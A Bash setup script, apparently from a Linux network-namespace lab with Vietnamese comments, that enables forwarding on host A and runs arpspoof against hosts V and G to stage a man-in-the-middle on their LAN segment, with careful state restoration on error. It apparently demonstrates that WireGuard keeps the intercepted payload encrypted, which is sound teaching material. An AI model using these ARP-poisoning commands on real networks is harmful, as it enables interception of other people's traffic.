#!/usr/bin/env bash
set -Eeuo pipefail
ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "$ROOT_DIR/scripts/common.sh"
require_root
for ns in a v g vpn; do require_ns "$ns"; done
command -v arpspoof >/dev/null 2>&1 || { echo "[ERROR] Thiếu arpspoof (gói dsniff)."; exit 1; }

install -d -m 700 "$PID_DIR"
for f in mitm-v.pid mitm-g.pid; do
  if [[ -f "$PID_DIR/$f" ]]; then
    oldpid="$(cat "$PID_DIR/$f" 2>/dev/null || true)"
    if [[ -n "$oldpid" ]] && kill -0 "$oldpid" 2>/dev/null; then
      echo "[ERROR] MITM helper có vẻ đang chạy (PID $oldpid). Dùng stop-mitm-vpn.sh trước."; exit 1
    fi
    rm -f "$PID_DIR/$f"
  fi
done

# Preserve A's prior forwarding state and exact host route, then add the WAN endpoint route.
ip netns exec a sysctl -n net.ipv4.ip_forward > "$PID_DIR/a-ip-forward.before"
ip netns exec a sysctl -n net.ipv4.conf.all.send_redirects > "$PID_DIR/a-redirects-all.before"
ip netns exec a sysctl -n net.ipv4.conf.eth0.send_redirects > "$PID_DIR/a-redirects-eth0.before"
ip -n a route show exact "$VPN_IP/32" > "$PID_DIR/a-vpn-route.before"

cleanup_on_error() {
  rc=$?
  trap - ERR
  for f in mitm-v.pid mitm-g.pid; do
    if [[ -f "$PID_DIR/$f" ]]; then kill "$(cat "$PID_DIR/$f")" 2>/dev/null || true; rm -f "$PID_DIR/$f"; fi
  done
  if [[ -f "$PID_DIR/a-vpn-route.before" ]]; then
    if [[ -s "$PID_DIR/a-vpn-route.before" ]]; then
      read -r -a oldroute < "$PID_DIR/a-vpn-route.before"
      ip -n a route replace "${oldroute[@]}" 2>/dev/null || true
    else
      ip -n a route del "$VPN_IP/32" via "$G_IP" dev eth0 2>/dev/null || true
    fi
  fi
  if [[ -f "$PID_DIR/a-ip-forward.before" ]]; then
    old="$(cat "$PID_DIR/a-ip-forward.before")"
    ip netns exec a sysctl -w "net.ipv4.ip_forward=$old" >/dev/null 2>&1 || true
  fi
  if [[ -f "$PID_DIR/a-redirects-all.before" ]]; then
    old="$(cat "$PID_DIR/a-redirects-all.before")"
    ip netns exec a sysctl -w "net.ipv4.conf.all.send_redirects=$old" >/dev/null 2>&1 || true
  fi
  if [[ -f "$PID_DIR/a-redirects-eth0.before" ]]; then
    old="$(cat "$PID_DIR/a-redirects-eth0.before")"
    ip netns exec a sysctl -w "net.ipv4.conf.eth0.send_redirects=$old" >/dev/null 2>&1 || true
  fi
  rm -f "$PID_DIR/a-ip-forward.before" "$PID_DIR/a-vpn-route.before" \
    "$PID_DIR/a-redirects-all.before" "$PID_DIR/a-redirects-eth0.before"
  exit "$rc"
}
trap cleanup_on_error ERR

ip -n a route replace "$VPN_IP/32" via "$G_IP" dev eth0
ip netns exec a sysctl -w net.ipv4.ip_forward=1 >/dev/null
ip netns exec a sysctl -w net.ipv4.conf.all.send_redirects=0 >/dev/null
ip netns exec a sysctl -w net.ipv4.conf.eth0.send_redirects=0 >/dev/null

# A poisons V's mapping for G and G's mapping for V. VPN is on a different subnet.
ip netns exec a arpspoof -i eth0 -t "$V_IP" "$G_IP" >"$PID_DIR/mitm-v.log" 2>&1 &
echo $! > "$PID_DIR/mitm-v.pid"
ip netns exec a arpspoof -i eth0 -t "$G_IP" "$V_IP" >"$PID_DIR/mitm-g.log" 2>&1 &
echo $! > "$PID_DIR/mitm-g.pid"
sleep 1
for f in mitm-v.pid mitm-g.pid; do kill -0 "$(cat "$PID_DIR/$f")"; done
trap - ERR

echo "[✓] A đang MITM trên đoạn LAN giữa V và G."
echo "    A có thể thấy gói UDP WireGuard; payload bên trong tunnel đã được mã hóa."
echo "    VPN Server ($VPN_IP) nằm ở WAN riêng, không phải máy cùng LAN để ARP spoof trực tiếp."
